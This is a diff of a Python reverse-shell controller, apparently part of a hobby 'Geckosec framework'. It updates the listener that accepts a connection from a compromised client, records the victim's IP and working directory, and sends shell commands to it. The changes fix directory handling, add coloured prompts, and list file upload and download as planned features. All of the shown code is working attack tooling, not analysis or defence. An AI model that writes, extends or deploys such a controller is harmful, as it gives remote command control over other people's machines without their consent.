@@ -3,13 +3,16 @@
 # A python Reverse-shell
 # Developed by Elieroc
 # Start of project : 25/11/2020
-# Actual version : 1.1
+# Actual version : 1.2
+# Bug of "cd" command was fixed and the path was be colored
+
+# Prochainement : Upload and Download functions + Fix the errored command
 
 import socket
 
 def main():
 
-    host, port = ('192.168.43.90', 1234)
+    host, port = ('192.168.1.100', 5555)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind((host, port))
@@ -18,21 +21,34 @@ def main():
     while True:
         sock.listen()
         conn, address = sock.accept()
-        print("/!\ Client connecté /!\ \n")
 
-        path = "\033[0;32m" + conn.recv(9999).decode("utf8") + '\033[1;36m$ \033[1;37m'
+        # On reçoit l'ip qui s'est connectée en premier
+        client_ip = conn.recv(9999).decode("utf8")
+
+        print(" |$| Client connecté : " + client_ip + " | " + str(port) + "\n")
+
+        # On reçoit le path ensuite
+        path = conn.recv(9999).decode("utf8")
 
         while True:
 
             banned_command = ["nano", "vi", "vim", "clear"]
             banned = 0
 
-            data=str( input(path) )
+            # On met la couleur du path en Bleue
+            print("\033[1;36m")
+
+            # On affiche le Path + Couleur Blanche (Gras)
+            print(path + "\033[1;37m")
+
+            data = str( input("\033[1;31m$ \033[1;37m") )
+
 
             for command in banned_command:
-                if data == command:
+                # On check le premier mot de la commande
+                if data.split(' ', 1)[0] == command:
                     print("Cette commande n'est pas utilisable")
-                    # On envoie une informatique vide pour ne pas perdre la connexion
+                    # On envoie une information vide pour ne pas perdre la connexion
                     null = " "
                     null = null.encode("utf-8")
                     conn.send(null)
@@ -42,11 +58,11 @@ def main():
             if data[:2] == "cd":
                 data = data.encode("utf8")
                 conn.send(data)
-                path = conn.recv(9999)
-                path = "\033[0;32m" + str( path.decode("utf-8", errors="ignore")) + '$ '
+                path = conn.recv(9999).decode("utf-8", errors="ignore")
+                continue
 
             if data == "exit":
-                print("Merci d'avoir utilisé Geckosec framework !")
+                print("Merci d'avoir utilisé Geckosec Framework !\n")
                 conn.close()
                 sock.close()
                 return 0
